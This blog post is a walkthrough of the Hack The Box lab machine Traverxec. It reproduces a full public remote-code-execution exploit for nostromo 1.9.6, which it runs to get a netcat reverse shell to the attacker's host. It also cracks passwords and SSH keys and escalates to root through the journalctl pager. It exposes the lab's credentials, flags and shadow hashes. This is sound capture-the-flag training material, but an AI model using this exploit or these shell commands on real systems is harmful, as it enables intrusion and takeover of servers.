---
layout: post
title: "[HTB] Traverxec - write up"
published: true
date: 2020-03-25
description:  Easy and fun linux machine. Which is quite straight forward. This is a good example that one needs to keep his tools updates. Indeed, not real mistakes were done by the dev. but outdated tools are vulnerable.
img: posts/traverxec/traverxec_logo.png # Add image post (optional)
tags: [RCE, nostromon, nHTTPd, GTFO, Enumeration, Linux, HTB, Easy] # add tag
os: Linux
difficulty: Easy
points: 20
release: 2019-11-16
ip: 10.10.10.165
---

# Summary:

{{ page.description }}

### Foothold:


```sh
$nmap -sC -sV -oA nmap/default 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 19:50 CET
Nmap scan report for 10.10.10.165
Host is up (0.070s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
```

To we get a `ssh/22` and a `http/80`. We see it is a Debian machine and using the code on the OpenSSH version, we should be able to get the version of linux: Debian 10 which was released in 2019, so quite recent.

Visiting the website, we see a personal webpage for a guy called david (maybe login :) ) and his startup. There is a form at the bottom. but it does not work - no mail set.

We can run ffuf (https://github.com/ffuf/ffuf) to look for directories:

```sh
$ ~/Git/ffuf/ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.165/FUZZ

    /'___\  /'___\           /'___\
   /\ \__/ /\ \__/  __  __  /\ \__/
   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
     \ \_\   \ \_\  \ \____/  \ \_\
      \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.165/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 200, Size: 15674, Words: 3910, Lines: 401]
css                     [Status: 301, Size: 314, Words: 19, Lines: 14]
icons                   [Status: 301, Size: 314, Words: 19, Lines: 14]
img                     [Status: 301, Size: 314, Words: 19, Lines: 14]
index.html              [Status: 200, Size: 15674, Words: 3910, Lines: 401]
js                      [Status: 301, Size: 314, Words: 19, Lines: 14]
lib                     [Status: 301, Size: 314, Words: 19, Lines: 14]
:: Progress: [4614/4614] :: Job [1/1] :: 13 req/sec :: Duration: [0:05:40] :: Errors: 82 ::
```

Though we don't see much. We can look at the different folders see if we can access them. And indeed, we can view a list of files and stuff. Nothing remarkable, however, we got a server name and version: **nostromo 1.9.6**.

<img src="{{site.baseurl}}/assets/img/posts/traverxec/image-20200325201436144.png" alt="image-20200325201436144" style="display: block;  margin-left: auto; margin-right: auto;" />

 Looking online, and we can see that it is a webserver solution in `nHTTPd` [https://gsp.com/cgi-bin/man.cgi?topic=NHTTPD](https://gsp.com/cgi-bin/man.cgi?topic=NHTTPD). FIY, this manual will be valuable. We can see at the bottom a date 10<sup>th</sup> April 2016. If this is the case, we can look at **searchsploit** to see if there are known exploits.

```sh
$searchsploit nostromo
------------------------------------------------- ----------------------------------------
 Exploit Title                                   |  Path
                                                 | (/usr/share/exploitdb/)
------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal RCE (Metasploit)  | exploits/multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution           | exploits/multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal RCE  | exploits/linux/remote/35466.sh
------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

And indeed, there is a remote code execution exploit we can use on this specific version. Let's look at the code to see what it does.

```python
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

#cve2019_16278.py

#!/usr/bin/env python

import sys
import socket

art = """

                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/



"""
help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    print(art)

    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)

    except IndexError:
        print(help_menu)
```

This is quite straight forward, this script injects the code in a `POST` socket. The script seems to be interactive so let's run it. We see that we need to give the IP, Port and command.

```sh
$python 47837.py 10.10.10.165 80 whoami


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Wed, 25 Mar 2020 19:33:54 GMT
Server: nostromo 1.9.6
Connection: close


www-data
```

Great, running **whoami**, we have a response. This means we can make a reverse shell. For that we need two terminal windows. In the first window we set a **nc listener**, and on the other we run the following command

terminal 1:
```sh
$python 47837.py 10.10.10.165 80 "nc -e /bin/bash 10.10.15.37 1231"
```

terminal 2:
```sh
$nc -lvnp 1231
listening on [any] 1231 ...
connect to [10.10.15.37] from (UNKNOWN) [10.10.10.165] 39936
whoami
www-data
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$
```

Cool, we are in. The lines after *www-data* are there to upgrade the terminal to something descent. A good site to have for spawning TTY shells is [https://netsec.ws/?p=337](https://netsec.ws/?p=337). To upgrade here's another resource [https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)

So we `ctrl+z` , this will bring us back to our local shell then we type `stty raw -echo` and then `fg + [enter x2]`. This will bring use back to the shell and we get proper functionalities such as tab, and history.

Listing the home directory, we see that there is only one user `david`, but we are not allowed to cd his directory. Let's go and see the website directory in `/var/nostromo`. We find a `conf` folder, in which we might get some info

```sh
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www

```

Great, so we get a login, and finding different useful information. We also have a domain name `traverxec.htb`. We can add this to our `/etc/hosts`

```sh
$nano /etc/hosts
127.0.0.1       localhost
127.0.1.1       parrot
10.10.10.165    traverxec.htb
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

This is a good habit as sometimes, websites won't allow access to certain pages if the host name is not specified. Now is there a password in `.htpasswd`?

```sh
www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

```

Yes, a hash. Let's ask John to help us. `john hash`. Having already ran the hash against `rockyou.txt`, I have to show the password

```sh
$john --show hash
david:Nowonly4me
```

**Success**, we got a password. Now, what is it for? It does not work with `ssh`. Looking back at the `config` file, there is `HOMEDIRS` that could be interesting. Remember the manual (RTFM)

> # [HOMEDIRS](https://gsp.com/cgi-bin/man.cgi?topic=NHTTPD#HOMEDIRS)
>
> To serve the home directories of your users via HTTP, enable the  homedirs option by defining the path in where  the home directories are stored, normally /home. To access a users home  directory enter a ~ in the URL followed by the home directory name like in  this example:
>
> http://www.nazgul.ch/~hacki/
>
> The content of the home directory is handled exactly the same way as a directory  in your document root. If some users don't want that their home directory can  be accessed via HTTP, they shall remove the world readable flag on their home  directory and a caller will receive a 403 Forbidden response. Also, if basic  authentication is enabled, a user can create an .htaccess file in his home  directory and a caller will need to authenticate.
>
> You can restrict the access within the home directories to a single sub  directory by defining it via the  homedirs_public option.

So we may be able to access the home folder with http://10.10.10.165/~david/, and indeed

<img src="{{site.baseurl}}/assets/img/posts/traverxec/image-20200325212744119.png" alt="image-20200325212744119" style="display: block;  margin-left: auto; margin-right: auto;" />
<!-- ![image-20200325212744119](/root/Documents/CTFs/HackTheBox/Traverxec/writeUp/image-20200325212744119.png) -->

Though there is not much there. Let's read the manual carefully. The last sentence: _"You can restrict the access within the home directories to a single sub  directory by defining it via the  homedirs_public option"_. And in, the config file specifies `/public_www`. Let's got there. Hum 404. This means that we are limited inside the `public_www` directory, but we need to find either a page, or subdirectory to connect to. What we can do is run `ffuf` on this new url and see if it finds something. -- nothing. Well, If we think about it. the `/home/david/public_www` is actually configured to be http://traverxec/~david/ so adding `public_www` to the url is equivalent of going to `/home/david/public_www/public_www` which thus does not exist. Yet we can access the `/public_www`, and if we think even more, who is accessing this folder? Yes `www-data`! This means, that in our shell, we should be able to cd to this directory

```sh
www-data@traverxec:/var/nostromo$ ls -la /home/david/public_www/
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
```

And indeed, we can list it. We see the `index.html` which is what is loaded. However, there is now a `protected-file-area`. Looking inside, we see two files:

```sh
www-data@traverxec:/var/nostromo$ ls -la /home/david/public_www/protected-file-area/
total 16
drwxr-xr-x 2 david david 4096 Oct 25 17:02 .
drwxr-xr-x 3 david david 4096 Oct 25 15:45 ..
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
```

Trying to read the `.htaccess`, we get a nice keep out message

```sh
www-data@traverxec:/var/nostromo$ cat /home/david/public_www/protected-file-area/.htaccess
realm David's Protected File Area. Keep out!

```

Let's try and go there in the brows **http://traverxec.htb/~david/protected-file-area/**. We get a prompt window in which we try our credentials: `david : Nowonly4me` and success, we are in!

# User

Now we can download the compress folder `backup-ssh-identity-files.tgz`. We can use `exiftool` to see the meta data

```sh
$exiftool backup-ssh-identity-files.tgz
ExifTool Version Number         : 11.91
File Name                       : backup-ssh-identity-files.tgz
Directory                       : .
File Size                       : 1915 bytes
File Modification Date/Time     : 2020:03:25 22:23:17+01:00
File Access Date/Time           : 2020:03:25 22:23:17+01:00
File Inode Change Date/Time     : 2020:03:25 22:24:11+01:00
File Permissions                : rw-r--r--
File Type                       : GZIP
File Type Extension             : gz
MIME Type                       : application/x-gzip
Compression                     : Deflated
Flags                           : (none)
Modify Date                     : 2019:10:25 23:02:59+02:00
Extra Flags                     : (none)
Operating System                : Unix
```

So we can use `gzip` to decompress it

```sh
$gzip -d backup-ssh-identity-files.tgz
$ls
backup-ssh-identity-files.tar
```

and now we have a `*.tar` file, which we can unzip again.

```sh
$tar -xvf backup-ssh-identity-files.tar
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub

```

Great, rsa keys. Can we directly connect with it or does it require a passphrase:

```sh
$ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa':
```

hum... passphrase, we are now certain that it is indeed david's rsa key. What we can do now is try and crack the passphrase using john. So what we first need to do, is convert the ssh file in a john friendly format. After which we can crack.

```sh
$/usr/share/john/ssh2john.py id_rsa > id_rsa.john
```

and now we crack

```sh
$john id_rsa.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hunter           (id_rsa)
Proceeding with incremental:ASCII
1g 0:00:00:14  3/3 0.07127g/s 739373p/s 739373c/s 739373C/s 030n11..030n24
hunter           (id_rsa)
Session aborted
```

Ok, it worked, though john spewed out a lot of lines and the password twice. I forced quit the thing because it wouldn't stop even though we found the hash. Anyway, we got the ssh passphrase `hunter`. Let's try to reconnect

```sh
$ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Wed Mar 25 17:25:44 2020 from 10.10.14.11
david@traverxec:~$ whoami
david
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
```

**Great!** We got user.txt. Let's got to root now.

# Root

Trying to do `sudo -l`, we realise that none of the passwords we found works. so we'll need to escalate our privileges differently. What we can do is upload `linpeas.sh`from [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). We make a http server on our local machine and upload the file with `wget`.

```sh
[LOCAL]
#python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

[TARGET]
david@traverxec:/tmp$ wget http://10.10.15.37/linpeas.sh
--2020-03-25 17:50:06--  http://10.10.15.37/linpeas.sh
Connecting to 10.10.15.37:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 160486 (157K) [text/x-sh]
Saving to: ‘linpeas.sh.1’

linpeas.sh.1         100%[=====================>] 156.72K   126KB/s    in 1.2s

2020-03-25 17:50:08 (126 KB/s) - ‘linpeas.sh.1’ saved [160486/160486]

david@traverxec:/tmp$ sh linpeas.sh
```

The first information we get is regarding the linux version the box is running

```sh
===========================( Basic information )=====================================
OS: Linux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)
User & Groups: uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
Hostname: traverxec
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)
/home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
New path exported: /home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local
/sbin:/usr/sbin:/sbin
```

So we got a linux version, and there is the PATH which is highlighted in the output which means that it is a vulnerability we can exploit. Indeed, there are two files in this bin folder. Let's take a look

```sh
david@traverxec:~/bin$ pwd
/home/david/bin
david@traverxec:~/bin$ ls -al
total 16
drwx------ 2 david david 4096 Mar 25 17:53 .
drwx--x--x 6 david david 4096 Mar 25 17:49 ..
-r-------- 1 david david  802 Oct 25 16:26 server-stats.head
-rwx------ 1 david david  363 Oct 25 16:26 server-stats.sh

```
The first folder is just a nice ASCII image

```sh
david@traverxec:~/bin$ cat server-stats.head
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""'

david@traverxec:~/bin$
```

Not much to see. The second file though is much more interesting

```sh
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

It's a bash script which tries to load some stats. However, we can see that it runs `sudo` at the end even though we cannot write this file. Let's look at `GTFO`[https://gtfobins.github.io/](https://gtfobins.github.io/)

```sh
$~/Git/gtfo/gtfo -b journalctl
   _  _           _    __
 _| || |_        | |  / _|
|_  __  _|   __ _| |_| |_ ___
 _| || |_   / _` | __|  _/ _ \
|_  __  _| | (_| | |_| || (_) |
  |_||_|    \__, |\__|_| \___/
             __/ |
            |___/



Code:   journalctl
        !/bin/sh

Type:   shell


Code:   sudo journalctl
        !/bin/sh

Type:   sudo

```

We see that if we can run `journalctl` as root, we can run a shell. We cannot run only `journalctl`

```sh
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl
[sudo] password for david:
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-- Logs begin at Wed 2020-03-25 17:43:25 EDT, end at Wed 2020-03-25 18:05:19 EDT. --
Mar 25 17:49:58 traverxec sudo[11363]: pam_unix(sudo:auth): conversation failed
Mar 25 17:49:58 traverxec sudo[11363]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Mar 25 17:49:58 traverxec sudo[11363]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=list
Mar 25 17:53:41 traverxec su[11672]: pam_unix(su-l:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost=  user=david
Mar 25 17:53:43 traverxec su[11672]: FAILED SU (to david) www-data on none
```

However, we can run the last command of the bash file printing the last 5 lines of log files. On this last command we are piping the output to cat. Let's remove the pipeline and just run `journalctl`.

```sh
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Wed 2020-03-25 17:43:25 EDT, end at Wed 2020-03-25 18:09:49 EDT. --
Mar 25 17:49:58 traverxec sudo[11363]: pam_unix(sudo:auth): conversation failed
Mar 25 17:49:58 traverxec sudo[11363]: pam_unix(sudo:auth): auth could not identify password for [www
Mar 25 17:49:58 traverxec sudo[11363]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ;
Mar 25 17:53:41 traverxec su[11672]: pam_unix(su-l:auth): authentication failure; logname= uid=33 eui
Mar 25 17:53:43 traverxec su[11672]: FAILED SU (to david) www-data on none
lines 1-6/6 (END)
```

We are now in `less` (or `vi`, I don't know), never the less we can run the command to get a shell, from the editor: `!/bin/sh`

```sh
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Wed 2020-03-25 17:43:25 EDT, end at Wed 2020-03-25 18:09:49 EDT. --
Mar 25 17:49:58 traverxec sudo[11363]: pam_unix(sudo:auth): conversation failed
Mar 25 17:49:58 traverxec sudo[11363]: pam_unix(sudo:auth): auth could not identify password for [www
Mar 25 17:49:58 traverxec sudo[11363]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ;
Mar 25 17:53:41 traverxec su[11672]: pam_unix(su-l:auth): authentication failure; logname= uid=33 eui
Mar 25 17:53:43 traverxec su[11672]: FAILED SU (to david) www-data on none
!/bin/sh
# whoami
root
# cat /root/root.txt
9aa36a6d76f785dfd320a478f6e0d906
```

**Success!**

**Guanicoe**

| name | hash |
| ------------- |:-------------:| -----:|
| root | $6$JS78lx7ObSd/2eY2$zkk.LEer7SmMyeSSm3kbjm/.1LoTrLFeKnpHP43mA/kY/RGNRTcEp96WsD2QZhBYavYOZTSVuSVVMFzUFn86V0 |
| david  | $6$maAFQhyFbcK/2XgC$iJUcfeGtIBZFHbE1ugl00Pm9r023byxysujFq3sbEgmA4oP7ivtHYAI3Cww1ET.z9Je3vostL.PxbvD2c6WXk/ |
